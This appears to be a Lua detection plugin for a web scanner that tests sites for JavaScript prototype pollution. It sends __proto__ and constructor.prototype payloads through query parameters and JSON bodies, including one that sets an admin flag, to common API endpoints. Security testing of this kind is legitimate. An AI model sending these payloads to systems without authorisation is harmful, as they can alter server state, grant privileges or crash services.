-- prototype_pollution.lua
-- Detects JavaScript Prototype Pollution vulnerabilities
-- Common in Node.js/Express applications — high-value bug bounty target
--
-- Tests:
--   1. Query parameter pollution (__proto__, constructor.prototype)
--   2. JSON body pollution via POST
--   3. Checks if polluted property is reflected

local base_url = TARGET:match("^(https?://[^/]+)")
if not base_url then return end

-- Unique marker to detect successful pollution
local marker = "SENTINEL_PP_" .. tostring(math.random(100000, 999999))

-- Prototype pollution payloads via query parameters
local query_payloads = {
    "__proto__[polluted]=" .. marker,
    "__proto__.polluted=" .. marker,
    "constructor[prototype][polluted]=" .. marker,
    "constructor.prototype.polluted=" .. marker,
    "__proto__[toString]=" .. marker,
    "__proto__[status]=510",
}

-- Test query parameter pollution on the main target
for _, payload in ipairs(query_payloads) do
    local sep = TARGET:find("?") and "&" or "?"
    local test_url = TARGET .. sep .. payload

    local resp = http.get(test_url)
    if resp then
        -- Check if our marker appears in the response body
        if resp.body and resp.body:find(marker, 1, true) then
            report.finding("high", "custom", "Prototype Pollution via Query Parameter",
                "Prototype pollution detected: injected property reflected in response. " ..
                "Payload: " .. payload, test_url)
            break
        end

        -- Check if status code changed (status pollution)
        if payload:find("status") and resp.status == 510 then
            report.finding("high", "custom", "Prototype Pollution (Status Override)",
                "Prototype pollution confirmed: HTTP status code was overridden to 510 via " ..
                "__proto__[status] injection.", test_url)
            break
        end
    end
end

-- JSON body pollution payloads
local json_payloads = {
    '{"__proto__": {"polluted": "' .. marker .. '"}}',
    '{"constructor": {"prototype": {"polluted": "' .. marker .. '"}}}',
    '{"__proto__": {"status": 510}}',
    '{"__proto__": {"admin": true}}',
}

-- Test JSON body pollution on common API endpoints
local api_paths = {"", "/api", "/api/v1", "/graphql", "/data", "/update", "/settings"}
for _, path in ipairs(api_paths) do
    local url = base_url .. path
    for _, json_body in ipairs(json_payloads) do
        local resp = http.post_json(url, json_body)
        if resp and resp.status < 500 then
            if resp.body and resp.body:find(marker, 1, true) then
                report.finding("high", "custom", "Prototype Pollution via JSON Body",
                    "Server-side prototype pollution detected in JSON body. " ..
                    "Endpoint: " .. url .. ", Payload: " .. json_body, url)
                return -- one finding is enough
            end

            if json_body:find('"status": 510') and resp.status == 510 then
                report.finding("high", "custom", "Prototype Pollution (JSON Status Override)",
                    "Confirmed prototype pollution via JSON body — status overridden to 510. " ..
                    "Endpoint: " .. url, url)
                return
            end
        end
    end
end
